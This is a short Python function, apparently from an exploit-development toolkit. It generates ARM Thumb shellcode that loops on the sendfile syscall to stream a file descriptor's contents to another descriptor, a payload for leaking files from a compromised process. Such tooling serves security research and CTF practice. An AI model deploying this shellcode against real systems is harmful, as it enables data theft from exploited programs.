# send a file

def generate(in_fd, out_fd):
    """sends a file to user in thumb mode

    Args: 
        in_fd  (str/int): in file descriptor
        out_fd (str/int): out file descriptor
    """

    sc = ''
    sc += """
    sub r4, r4, r4
loop_1:
    """

    try:
        xin_fd = int(in_fd)
        sc += 'mov r1, #%s' % (xin_fd)
    except:
        sc += 'mov r1, %s' % (in_fd)

    sc += """
    mov r0, #%s
    sub r2, r2, r2
    mov r3, #255
    mov r7, #(0+187)
    svc 1
    """ % (out_fd)

    sc += """
    cmp r0, r4
    bgt loop_1
    """

    return sc
